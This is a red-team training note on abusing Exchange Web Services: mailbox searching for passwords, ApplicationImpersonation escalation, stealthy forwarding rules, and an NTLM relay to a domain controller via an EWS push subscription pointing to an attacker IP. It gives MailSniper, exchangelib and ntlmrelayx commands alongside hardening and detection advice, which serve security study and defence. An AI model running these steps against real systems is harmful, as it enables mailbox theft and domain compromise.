---
tags: [active-directory, azure, hybrid, exchange, vapt]
difficulty: expert
module: "65 - Hybrid Identity, Entra ID, and Exchange Attacks"
topic: "65.11 Exchange Web Services EWS Abuse"
---
# Exchange Web Services (EWS) Abuse

## 1. Introduction to Exchange Web Services (EWS)
Exchange Web Services (EWS) is a legacy, yet highly prevalent, cross-platform API that enables applications to access mailbox items such as email messages, meetings, and contacts from Exchange Online, Exchange Online as part of Office 365, and on-premises versions of Exchange starting with Exchange Server 2007.

In the context of an enterprise Active Directory (AD) and hybrid environment, EWS represents a high-value attack surface. If an attacker compromises a set of valid credentials (or a session token, or an NTLM hash), EWS provides a direct avenue to exfiltrate sensitive corporate data, search for passwords in mailboxes, and manipulate mailbox rules to establish persistence. 
EWS operates primarily over HTTP/HTTPS, utilizing SOAP (Simple Object Access Protocol) XML messages to interface with the Exchange backend. The standardized nature of SOAP, combined with the vast amount of sensitive data stored in mailboxes, makes EWS a lucrative target for advanced persistent threats (APTs) and ransomware operators alike.

## 2. Core Mechanisms and Architecture
EWS endpoints are typically located at standard URLs, making them easily discoverable during the reconnaissance phase of an engagement. The most common endpoint is:
`https://<exchange-server>/EWS/Exchange.asmx`

### 2.1 Authentication Methods
EWS supports a variety of authentication protocols, which heavily depend on the configuration of the Exchange server and the organization's overarching identity posture:
1.  **Basic Authentication:** Plaintext credentials encoded in Base64. While Microsoft has pushed to deprecate Basic Auth in Exchange Online, it is still frequently encountered in on-premises legacy setups or misconfigured hybrid environments.
2.  **NTLM Authentication:** A challenge-response mechanism commonly used in internal AD environments. This makes EWS susceptible to Pass-the-Hash (PtH) and NTLM relay attacks.
3.  **Kerberos Authentication:** A ticket-based authentication system reliant on Service Principal Names (SPNs). Attackers can use forged Kerberos tickets (Silver/Golden tickets) to access EWS.
4.  **OAuth 2.0 (Modern Authentication):** Utilizes access tokens (JWTs) and is prevalent in Entra ID (formerly Azure AD) environments. Token theft allows attackers to bypass MFA and access EWS.

### 2.2 Attack Architecture Diagram
```text
  +-----------------------+                                          +-------------------------------+
  |   Attacker Machine    |                                          |   Exchange Server / Online    |
  |                       |       (1) Discover EWS Endpoint          |                               |
  |  [ EWS Toolkit ]      | ---------------------------------------> |  /EWS/Exchange.asmx           |
  |  [ MailSniper ]       |                                          |                               |
  +-----------------------+ <--------------------------------------- +-------------------------------+
            |                    (2) 401 Unauthorized (Auth Types)                 |
            |                                                                      |
            |                    (3) Authenticate (Creds / Hash / Token)           |
            +--------------------------------------------------------------------> |
                                                                                   |
  +-----------------------+      (4) SOAP XML Request (FindItem / GetItem)         |
  |   Data Exfiltration   | <----------------------------------------------------+ |
  |   & Rule Manipulation |                                                        | |
  +-----------------------+ -----------------------------------------------------> | |
                                 (5) SOAP XML Response (Email Data / Rule Set)     | |
                                                                                   V V
                                                                     +-------------------------------+
                                                                     |   Target Mailboxes            |
                                                                     |   - CEO, IT Admin, HR         |
                                                                     |   - Sensitive Attachments     |
                                                                     +-------------------------------+
```

## 3. Offensive Strategies and Abuse Vectors
### 3.1 Mailbox Search and Data Exfiltration
Once authenticated, an attacker can utilize EWS to programmatically search through all available folders in a user's mailbox. 
High-value targets typically include:
*   Passwords, secrets, or API keys sent in plaintext by automated systems or users.
*   VPN configuration files, certificates, and remote access instructions.
*   Sensitive internal documents such as M&A strategies, financial reports, and employee PII.

Attackers often deploy automated scripts to search for keywords across the entire mailbox structure, utilizing the `FindItem` and `GetItem` EWS operations.

### 3.2 EWS Delegation and Impersonation
Exchange supports two distinct mechanisms for accessing mailboxes other than your own: delegation and impersonation.
*   **Delegation:** Requires explicit permissions (e.g., Send As, Receive As) configured by the mailbox owner or an administrator. The actions performed are typically logged under the delegate's account.
*   **Impersonation:** This is an administrative feature governed by the `ApplicationImpersonation` Management Role. It is designed for service accounts (e.g., archiving software, backup solutions). If an attacker compromises an account holding the `ApplicationImpersonation` role, they can effectively access *any* mailbox in the Exchange organization without needing explicit delegation rights. This is a massive privilege escalation vector.

### 3.3 Persistence via Malicious Inbox Rules
EWS allows for the programmatic creation and modification of Inbox rules. This serves as an incredibly stealthy persistence mechanism that operates server-side, meaning it executes regardless of whether the user is actively logged into their email client.
Attackers can create rules that:
*   Silently forward emails containing specific keywords (e.g., "wire transfer", "invoice", "password reset") to an external address controlled by the attacker.
*   Move security alert emails (e.g., from the SOC, IT, or automated security platforms) directly to the "Deleted Items" or "Junk" folder and mark them as read. This effectively blinds the victim and the security team to the ongoing attack.

### 3.4 Bypassing Multi-Factor Authentication (MFA)
In some hybrid configurations, conditional access policies and MFA are enforced at the Web App (OWA) level but inadvertently overlooked at the EWS endpoint. Attackers can leverage valid single-factor credentials via EWS to bypass these protections, provided legacy authentication has not been strictly blocked at the tenant level.

## 4. Exploitation Techniques and Tooling
### 4.1 Tooling Overview
Several robust open-source tools facilitate EWS abuse during Red Team engagements:
*   **MailSniper:** A PowerShell module specifically designed to search through email in a Microsoft Exchange environment for specific terms (passwords, insider intel, network architecture information, etc.).
*   **Ruler:** A tool written in Go that allows interaction with Exchange servers remotely. While known for MAPI/HTTP abuse, its ecosystem often intersects with EWS capabilities.
*   **EWSToolkit / EWS-Managed-API Scripts:** Custom scripts leveraging the official Microsoft EWS Managed API, often wrapped in PowerShell or C#.

### 4.2 Practical Exploitation with MailSniper
**Scenario:** The Red Team has compromised the plaintext credentials of a standard domain user.
**Step 1: Reconnaissance & EWS Discovery**
Identify the EWS endpoint. MailSniper can utilize Autodiscover to find this automatically.
```powershell
Invoke-GlobalMailSearch -Impersonation -ExchHostname mail.corp.local
```

**Step 2: Searching the Current User's Mailbox**
Search the victim's own mailbox for sensitive terms to facilitate lateral movement or privilege escalation.
```powershell
Invoke-SelfSearch -Mailbox victim@corp.local -ExchHostname mail.corp.local -Credential $cred
```

**Step 3: Exploiting ApplicationImpersonation (Privilege Escalation)**
If the compromised account possesses `ApplicationImpersonation` rights, the attacker can search all mailboxes across the organization.
```powershell
Invoke-GlobalMailSearch -Impersonation -ExchHostname mail.corp.local -Credential $cred
```

**Step 4: Extracting the Global Address List (GAL)**
EWS can be leveraged to dump the GAL, providing a comprehensive directory of users, groups, and contacts for further targeting.
```powershell
Get-GlobalAddressList -ExchHostname mail.corp.local -Credential $cred
```

### 4.3 Scripting EWS with Python (exchangelib)
In environments where PowerShell execution is strictly monitored or constrained, Python's `exchangelib` library provides a highly effective alternative for cross-platform EWS abuse.
```python
from exchangelib import Credentials, Account, Configuration, DELEGATE

# Setup credentials (can also use NTLM hashes depending on configuration)
creds = Credentials('DOMAIN\\\\username', 'password')
config = Configuration(server='mail.corp.local', credentials=creds)

# Connect to the account
account = Account(primary_smtp_address='victim@corp.local', config=config, autodiscover=False, access_type=DELEGATE)

# Search the Inbox for the keyword "password"
for item in account.inbox.filter(subject__icontains='password'):
    print(f"Subject: {item.subject}")
    print(f"Body: {item.text_body}")
```

## 5. Defense, Mitigation, and Hardening
### 5.1 Disable Legacy Authentication
The most critical defensive measure is the global disablement of legacy authentication protocols across both the Entra ID tenant and on-premises Exchange environments. Organizations must transition to Modern Authentication (OAuth 2.0) and rigorously enforce MFA for all EWS access.

### 5.2 Restrict EWS Access via Configuration
*   **EWS Allow/Block Lists:** Utilize the `Set-CASMailbox` cmdlet to explicitly block EWS access for user accounts that do not require it.
    ```powershell
    Set-CASMailbox -Identity "User Name" -EwsEnabled $false
    ```
*   **Client Access Rules:** In Exchange Online, deploy Client Access Rules to restrict EWS access based on IP address ranges, authentication types, or specific user properties.

### 5.3 Audit ApplicationImpersonation Roles
Regularly audit the environment to identify which accounts hold the `ApplicationImpersonation` Management Role. Limit this role to the absolute minimum necessity (e.g., specific, highly monitored backup or archiving service accounts). 
```powershell
Get-ManagementRoleAssignment -Role "ApplicationImpersonation"
```

## 6. Threat Hunting and Detection
### 6.1 Log Analysis
*   **Exchange Admin Audit Logs:** Continuously monitor for unauthorized changes to mailbox delegation and RBAC role assignments.
*   **Mailbox Audit Logs:** Enable and monitor Mailbox Audit Logging for `FolderBind`, `MessageBind`, and `SendAs` operations. Pay particular attention to operations originating from unusual IP addresses or suspicious user agents (e.g., Python `requests`, customized attacker tool user agents).
*   **IIS Logs:** On-premises Exchange servers log EWS access in IIS logs. Hunt for high volumes of traffic directed at `/EWS/Exchange.asmx`, which is a strong indicator of automated mailbox dumping or brute-force search activities.

### 6.2 Behavioral Anomalies
Detecting EWS abuse often relies on behavioral anomalies rather than static signatures:
*   A user account suddenly accessing hundreds of mail messages in a short timeframe.
*   The creation of complex Inbox rules that forward emails externally or delete items based on security-related keywords.
*   EWS access occurring from geographic locations or ASNs that are abnormal for the user profile.

## 7. Advanced Exploitation Notes
### 7.1 Cross-Tenant EWS Abuse
In misconfigured multi-tenant Exchange deployments, EWS might mistakenly allow authentication attempts to bleed over, though modern isolation in Office 365 largely mitigates this.
### 7.2 Pass the Hash with EWS
Since EWS on-prem often supports NTLM, an attacker holding only the NT hash of a user can authenticate directly to the `Exchange.asmx` endpoint.

## 8. Chaining Opportunities
*   [[12 - Bypassing LAPS Local Admin Password Solution]] - EWS searches frequently uncover LAPS passwords improperly transmitted via email or stored in drafts by IT personnel.
*   [[14 - GPO Abuse at Scale]] - Credentials harvested from EWS can provide the necessary domain privileges to modify Group Policy Objects.
*   [[13 - Extracting gMSA Group Managed Service Accounts]] - EWS access to administrative mailboxes may reveal deployment scripts or documentation containing critical details about gMSA infrastructure and authorized hosts.

## 9. Related Notes
*   [[01 - Kerberoasting and AS-REP Roasting]]
*   [[05 - Exchange ProxyLogon and ProxyShell]]
*   [[22 - Microsoft 365 Token Theft]]
*   [[09 - Resource Based Constrained Delegation]]

## Real-World Attack Scenario
## Real-World Attack Scenario: Exchange Web Services (EWS) Abuse

**1. Context and Environment:**
The attacker has established an initial foothold in a medium-sized enterprise network by compromising a standard user's workstation via phishing. The environment operates a hybrid Active Directory setup with on-premises Exchange 2019 servers handling local mail routing. The organization has basic perimeter defenses and EDR on endpoints but lacks strict monitoring of internal Exchange API traffic. The attacker's objective is to escalate privileges and discover sensitive information to move laterally toward the Domain Controllers.

**2. Attacker Thought Process:**
"I have standard domain user credentials (`jdoe:Winter2024!`). Since there's an on-premises Exchange server, EWS is likely exposed internally. Exchange permissions are notoriously difficult to manage, and administrators often over-provision access to shared mailboxes or IT support groups. If I can query EWS, I can silently search for passwords, VPN profiles, or sensitive documents without triggering EDR alerts on local machines. Furthermore, if I can manipulate delegate permissions or abuse EWS PushSubscriptions, I might be able to force the Exchange server's high-privileged machine account to authenticate to me, which I can relay to the DC."

**3. Reconnaissance and Enumeration:**
The attacker begins by identifying the EWS endpoint and verifying their access using a standard PowerShell web request.
```powershell
$Cred = Get-Credential
$EwsUrl = "https://mail.corp.local/EWS/Exchange.asmx"
Invoke-WebRequest -Uri $EwsUrl -Credential $Cred -UseBasicParsing
```
Confirming the endpoint is active, they load the `MailSniper` module in memory to automate the enumeration of mailboxes they might have access to.
```powershell
Invoke-MailSniper -ExchHostname mail.corp.local -Email jdoe@corp.local -Remote
```

**4. Exploitation and Execution:**
The enumeration reveals that `jdoe` was temporarily granted `FullAccess` to the `IT_Helpdesk` shared mailbox months ago, and the permission was never revoked. The attacker targets this mailbox, searching specifically for terms related to credentials and infrastructure setup.
```powershell
Invoke-MailSniper -ExchHostname mail.corp.local -Email jdoe@corp.local -TargetMailbox it_helpdesk@corp.local -Terms "password, creds, admin, vpn, secret"
```
The search returns a hit: an email containing a script with hardcoded local administrator credentials for a segment of legacy application servers.
Not satisfied, the attacker decides to abuse the EWS `Subscribe` API. They start an NTLM relay server on their machine and craft a malicious SOAP request to the EWS endpoint, subscribing to push notifications and pointing the callback URL to their attacker IP.
```bash
# On attacker machine
impacket-ntlmrelayx -t ldap://dc01.corp.local --escalate-user jdoe
# Pushing the subscription via a Python EWS client
python3 ews_push.py -t https://mail.corp.local/EWS/Exchange.asmx -u jdoe -p 'Winter2024!' -url http://10.10.14.5:8080
```

**5. Post-Exploitation and Outcome:**
The Exchange server attempts to deliver the push notification to the attacker's HTTP server, authenticating with its machine account (`EXCH01$`). The `ntlmrelayx` script catches this authentication and relays it to the Domain Controller via LDAP. Because Exchange Windows Permissions group members often have extensive rights, the relay attack successfully grants `jdoe` DCSync privileges. The attacker immediately runs Mimikatz to dump the `krbtgt` hash, effectively achieving Domain Admin status.

